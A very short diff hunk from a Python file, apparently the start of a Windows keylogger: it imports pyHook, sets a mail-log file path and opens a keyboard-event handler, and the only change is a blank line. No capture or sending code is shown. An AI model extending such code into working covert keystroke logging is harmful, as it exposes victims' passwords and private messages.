@@ -1,4 +1,5 @@
 import pyHook, pythoncom, sys, logging
+
 advancedLogMail="C:\\path\\advanced_log_mail.txt"
     
 def OnKeyboardEvent(event):
